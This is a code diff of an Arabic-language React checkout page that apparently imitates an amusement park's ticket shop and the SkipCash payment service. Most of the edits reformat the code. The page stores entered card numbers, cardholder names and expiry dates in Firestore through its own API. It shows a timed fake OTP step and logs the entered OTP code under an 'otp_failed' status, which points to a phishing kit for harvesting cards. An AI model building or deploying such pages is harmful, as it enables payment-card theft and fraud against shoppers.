@@ -1,7 +1,15 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { AlertCircle, CreditCard, Loader2, ShieldCheck } from "lucide-react";
-import { api, buildUrl, type CreateCheckoutSubmissionInput } from "@shared/routes";
-import { QuestLegalFooter, QuestMobileTopBar, SessionTimerStrip } from "@/components/QuestMobileChrome";
+import {
+  api,
+  buildUrl,
+  type CreateCheckoutSubmissionInput,
+} from "@shared/routes";
+import {
+  QuestLegalFooter,
+  QuestMobileTopBar,
+  SessionTimerStrip,
+} from "@/components/QuestMobileChrome";
 import {
   buildTicketOrderItems,
   formatQar,
@@ -101,7 +109,11 @@ function maskCardNumber(value: string): string {
 }
 
 function validateBillingDetails(billing: BillingDetails): string | null {
-  if (!billing.firstName.trim() || !billing.lastName.trim() || !billing.phone.trim()) {
+  if (
+    !billing.firstName.trim() ||
+    !billing.lastName.trim() ||
+    !billing.phone.trim()
+  ) {
     return "يرجى إكمال جميع بيانات الفاتورة المطلوبة.";
   }
 
@@ -134,21 +146,28 @@ export default function Checkout() {
   const otpRevealTimerRef = useRef<number | null>(null);
   const otpVerifyTimerRef = useRef<number | null>(null);
 
-  const storedOrderItems = useMemo(() => buildTicketOrderItems(storedCart.quantities), [storedCart.quantities]);
+  const storedOrderItems = useMemo(
+    () => buildTicketOrderItems(storedCart.quantities),
+    [storedCart.quantities]
+  );
   const fallbackItem = {
     id: "adult" as const,
     name: ticketProductMap.adult.name,
     unitPrice: ticketProductMap.adult.unitPrice,
     quantity: 1,
   };
-  const orderItems = storedOrderItems.length > 0 ? storedOrderItems : [fallbackItem];
+  const orderItems =
+    storedOrderItems.length > 0 ? storedOrderItems : [fallbackItem];
   const subtotal = useMemo(() => getOrderSubtotal(orderItems), [orderItems]);
 
   const visitDate = parseStoredDate(storedCart.visitDateIso);
-  const bookingDateText = visitDate ? formatArabicDate(visitDate) : "١٧ فبراير ٢٠٢٦";
+  const bookingDateText = visitDate
+    ? formatArabicDate(visitDate)
+    : "١٧ فبراير ٢٠٢٦";
   const visitTime = storedCart.visitTime ?? "١٧:٣٠ - ٢٣:٥٩";
   const cardPreviewNumber = cardDetails.cardNumber || "•••• •••• •••• ••••";
-  const cardPreviewName = cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
+  const cardPreviewName =
+    cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
   const cardPreviewExpiry = cardDetails.expiry || "MM/YY";
 
   useEffect(() => {
@@ -221,11 +240,17 @@ export default function Checkout() {
       });
 
       if (!response.ok) {
-        const errorData = (await response.json().catch(() => null)) as { message?: string } | null;
-        throw new Error(errorData?.message ?? "تعذّر حفظ البيانات في Firestore.");
+        const errorData = (await response.json().catch(() => null)) as {
+          message?: string;
+        } | null;
+        throw new Error(
+          errorData?.message ?? "تعذّر حفظ البيانات في Firestore."
+        );
       }
 
-      const created = api.checkout.create.responses[201].parse(await response.json());
+      const created = api.checkout.create.responses[201].parse(
+        await response.json()
+      );
       setSubmissionId(created.id);
       setPaymentError(null);
       setOtpCode("");
@@ -236,7 +261,9 @@ export default function Checkout() {
       }, 5000);
     } catch (error) {
       setPaymentStep("idle");
-      setPaymentError(error instanceof Error ? error.message : "حدث خطأ أثناء حفظ البيانات.");
+      setPaymentError(
+        error instanceof Error ? error.message : "حدث خطأ أثناء حفظ البيانات."
+      );
     } finally {
       setIsSavingCheckout(false);
     }
@@ -262,15 +289,18 @@ export default function Checkout() {
 
         if (submissionId) {
           try {
-            await fetch(buildUrl(api.checkout.updateStatus.path, { id: submissionId }), {
-              method: api.checkout.updateStatus.method,
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                status: "otp_failed",
-                otpCode,
-                errorMessage: failureMessage,
-              }),
-            });
+            await fetch(
+              buildUrl(api.checkout.updateStatus.path, { id: submissionId }),
+              {
+                method: api.checkout.updateStatus.method,
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  status: "otp_failed",
+                  otpCode,
+                  errorMessage: failureMessage,
+                }),
+              }
+            );
           } catch {
             // Keep the UI flow resilient even if update logging fails.
           }
@@ -282,19 +312,24 @@ export default function Checkout() {
     }, 5000);
   };
 
-  const showOtpForm = paymentStep === "otp" || paymentStep === "verifyingOtp" || paymentStep === "failed";
+  const showOtpForm =
+    paymentStep === "otp" ||
+    paymentStep === "verifyingOtp" ||
+    paymentStep === "failed";
 
   return (
     <div className="min-h-screen bg-[#efefef] text-[#333]" dir="rtl" lang="ar">
       <div className="mx-auto flex min-h-screen w-full max-w-[1100px] flex-col bg-[#efefef]">
         <section className="relative h-[190px] overflow-hidden sm:h-[220px] md:h-[280px]">
           <img
-            src="https://images.unsplash.com/photo-1569263979104-865ab7cd8d13?auto=format&fit=crop&w=1200&q=80"
+            src="/2.png"
             alt="دوار ملون في مدينة ألعاب داخلية"
             className="h-full w-full object-cover"
           />
           <div className="absolute inset-0 bg-gradient-to-t from-black/55 to-black/5" />
-          <h1 className="absolute bottom-8 right-6 text-4xl font-black text-white sm:text-5xl">إتمام الشراء</h1>
+          <h1 className="absolute bottom-8 right-6 text-4xl font-black text-white sm:text-5xl">
+            إتمام الشراء
+          </h1>
         </section>
 
         <QuestMobileTopBar />
@@ -307,7 +342,9 @@ export default function Checkout() {
               <section className="bg-[#e9edf3] p-4 border-r-4 border-r-[hsl(var(--quest-purple))] text-[#5f5f5f] text-sm">
                 <p>
                   لديك قسيمة؟
-                  <span className="mr-1 text-[#4d4d4d]">اضغط هنا لإدخال الكود</span>
+                  <span className="mr-1 text-[#4d4d4d]">
+                    اضغط هنا لإدخال الكود
+                  </span>
                 </p>
               </section>
 
@@ -325,7 +362,10 @@ export default function Checkout() {
                       type="text"
                       value={billingDetails.firstName}
                       onChange={(event) =>
-                        setBillingDetails((current) => ({ ...current, firstName: event.target.value }))
+                        setBillingDetails((current) => ({
+                          ...current,
+                          firstName: event.target.value,
+                        }))
                       }
                       className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                     />
@@ -339,7 +379,10 @@ export default function Checkout() {
                       type="text"
                       value={billingDetails.lastName}
                       onChange={(event) =>
-                        setBillingDetails((current) => ({ ...current, lastName: event.target.value }))
+                        setBillingDetails((current) => ({
+                          ...current,
+                          lastName: event.target.value,
+                        }))
                       }
                       className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                     />
@@ -352,19 +395,30 @@ export default function Checkout() {
                     <input
                       type="tel"
                       value={billingDetails.phone}
-                      onChange={(event) => setBillingDetails((current) => ({ ...current, phone: event.target.value }))}
+                      onChange={(event) =>
+                        setBillingDetails((current) => ({
+                          ...current,
+                          phone: event.target.value,
+                        }))
+                      }
                       className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                     />
                   </label>
 
                   <label className="block sm:col-span-2">
                     <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                      البريد الإلكتروني <span className="text-[#bf2828]">*</span>
+                      البريد الإلكتروني{" "}
+                      <span className="text-[#bf2828]">*</span>
                     </span>
                     <input
                       type="email"
                       value={billingDetails.email}
-                      onChange={(event) => setBillingDetails((current) => ({ ...current, email: event.target.value }))}
+                      onChange={(event) =>
+                        setBillingDetails((current) => ({
+                          ...current,
+                          email: event.target.value,
+                        }))
+                      }
                       className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                     />
                   </label>
@@ -374,7 +428,9 @@ export default function Checkout() {
 
             <div>
               <section>
-                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">طلبك</h2>
+                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
+                  طلبك
+                </h2>
 
                 <div className="mt-3 overflow-hidden rounded-md border border-[#dedede] bg-white">
                   <div className="grid grid-cols-[1fr_auto] bg-[#f8bf14] px-3 py-2 text-sm font-bold text-[#202020]">
@@ -388,11 +444,20 @@ export default function Checkout() {
                         <div className="grid grid-cols-[1fr_auto] items-start gap-2">
                           <div>
                             <p className="font-semibold">
-                              {item.name} <span className="font-normal">× {item.quantity}</span>
+                              {item.name}{" "}
+                              <span className="font-normal">
+                                × {item.quantity}
+                              </span>
                             </p>
-                            <p className="mt-1 text-[11px] text-[#666]">تاريخ الحجز: {bookingDateText}</p>
-                            <p className="text-[11px] text-[#666]">وقت الزيارة: {visitTime}</p>
-                            <p className="text-[11px] text-[#666]">الفئة: تذاكر الدخول</p>
+                            <p className="mt-1 text-[11px] text-[#666]">
+                              تاريخ الحجز: {bookingDateText}
+                            </p>
+                            <p className="text-[11px] text-[#666]">
+                              وقت الزيارة: {visitTime}
+                            </p>
+                            <p className="text-[11px] text-[#666]">
+                              الفئة: تذاكر الدخول
+                            </p>
                           </div>
                           <p>{formatQar(item.unitPrice * item.quantity)}</p>
                         </div>
@@ -414,7 +479,9 @@ export default function Checkout() {
               </section>
 
               <section className="mt-7">
-                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">الدفع</h2>
+                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
+                  الدفع
+                </h2>
 
                 <div className="mt-3 rounded-xl border border-[#e8e8e8] bg-white p-3">
                   <div className="rounded-md border border-[#ececec] bg-[#f8f8f8] px-3 py-2 text-sm font-semibold text-[#3e3e3e] flex items-center gap-2">
@@ -423,18 +490,26 @@ export default function Checkout() {
                   </div>
 
                   <p className="mt-3 text-xs leading-5 text-[#444]">
-                    SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع لكل من العملاء والتجار.
+                    SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع
+                    لكل من العملاء والتجار.
                   </p>
 
                   <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
                     <p className="text-[11px] text-white/80">بطاقة الدفع</p>
-                    <div className="mt-5 text-lg font-semibold tracking-[0.12em]" dir="ltr">
+                    <div
+                      className="mt-5 text-lg font-semibold tracking-[0.12em]"
+                      dir="ltr"
+                    >
                       {cardPreviewNumber}
                     </div>
                     <div className="mt-5 flex items-end justify-between gap-3">
                       <div className="min-w-0">
-                        <p className="text-[10px] text-white/70">حامل البطاقة</p>
-                        <p className="truncate text-sm font-semibold">{cardPreviewName}</p>
+                        <p className="text-[10px] text-white/70">
+                          حامل البطاقة
+                        </p>
+                        <p className="truncate text-sm font-semibold">
+                          {cardPreviewName}
+                        </p>
                       </div>
                       <div className="shrink-0 text-right">
                         <p className="text-[10px] text-white/70">الانتهاء</p>
@@ -451,14 +526,18 @@ export default function Checkout() {
                   >
                     <label className="block">
                       <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                        اسم حامل البطاقة <span className="text-[#bf2828]">*</span>
+                        اسم حامل البطاقة{" "}
+                        <span className="text-[#bf2828]">*</span>
                       </span>
                       <input
                         type="text"
                         autoComplete="cc-name"
                         value={cardDetails.cardholderName}
                         onChange={(event) =>
-                          setCardDetails((current) => ({ ...current, cardholderName: event.target.value }))
+                          setCardDetails((current) => ({
+                            ...current,
+                            cardholderName: event.target.value,
+                          }))
                         }
                         className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                         placeholder="الاسم على البطاقة"
@@ -475,7 +554,10 @@ export default function Checkout() {
                         autoComplete="cc-number"
                         value={cardDetails.cardNumber}
                         onChange={(event) =>
-                          setCardDetails((current) => ({ ...current, cardNumber: formatCardNumber(event.target.value) }))
+                          setCardDetails((current) => ({
+                            ...current,
+                            cardNumber: formatCardNumber(event.target.value),
+                          }))
                         }
                         className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                         dir="ltr"
@@ -486,7 +568,8 @@ export default function Checkout() {
                     <div className="grid grid-cols-2 gap-3">
                       <label className="block">
                         <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                          تاريخ الانتهاء <span className="text-[#bf2828]">*</span>
+                          تاريخ الانتهاء{" "}
+                          <span className="text-[#bf2828]">*</span>
                         </span>
                         <input
                           type="text"
@@ -494,7 +577,10 @@ export default function Checkout() {
                           autoComplete="cc-exp"
                           value={cardDetails.expiry}
                           onChange={(event) =>
-                            setCardDetails((current) => ({ ...current, expiry: formatExpiry(event.target.value) }))
+                            setCardDetails((current) => ({
+                              ...current,
+                              expiry: formatExpiry(event.target.value),
+                            }))
                           }
                           className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                           dir="ltr"
@@ -528,7 +614,9 @@ export default function Checkout() {
                   {paymentStep === "waitingOtp" ? (
                     <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                       <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
-                      <p>جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 5 ثوانٍ.</p>
+                      <p>
+                        جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 5 ثوانٍ.
+                      </p>
                     </div>
                   ) : null}
 
@@ -547,7 +635,11 @@ export default function Checkout() {
                           type="text"
                           inputMode="numeric"
                           value={otpCode}
-                          onChange={(event) => setOtpCode(toDigitsOnly(event.target.value).slice(0, 6))}
+                          onChange={(event) =>
+                            setOtpCode(
+                              toDigitsOnly(event.target.value).slice(0, 6)
+                            )
+                          }
                           className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                           dir="ltr"
                           placeholder="رمز OTP من 6 أرقام"
@@ -560,7 +652,9 @@ export default function Checkout() {
                         disabled={paymentStep === "verifyingOtp"}
                         className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
                       >
-                        {paymentStep === "verifyingOtp" ? "جاري التحقق من OTP..." : "تحقق من OTP"}
+                        {paymentStep === "verifyingOtp"
+                          ? "جاري التحقق من OTP..."
+                          : "تحقق من OTP"}
                       </button>
                     </div>
                   ) : null}
@@ -573,21 +667,25 @@ export default function Checkout() {
                   ) : null}
 
                   <p className="mt-4 text-xs leading-5 text-[#666]">
-                    سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا الموقع، ولأغراض أخرى موضحة في
-                    سياسة الخصوصية.
+                    سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا
+                    الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
                   </p>
 
                   <button
                     type="button"
                     onClick={onProceedToPayment}
-                    disabled={paymentStep === "waitingOtp" || paymentStep === "verifyingOtp" || isSavingCheckout}
+                    disabled={
+                      paymentStep === "waitingOtp" ||
+                      paymentStep === "verifyingOtp" ||
+                      isSavingCheckout
+                    }
                     className="mt-4 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70"
                   >
                     {isSavingCheckout
                       ? "جاري حفظ الطلب..."
                       : paymentStep === "waitingOtp"
-                        ? "جاري طلب OTP..."
-                        : "المتابعة للدفع"}
+                      ? "جاري طلب OTP..."
+                      : "المتابعة للدفع"}
                   </button>
                 </div>
               </section>
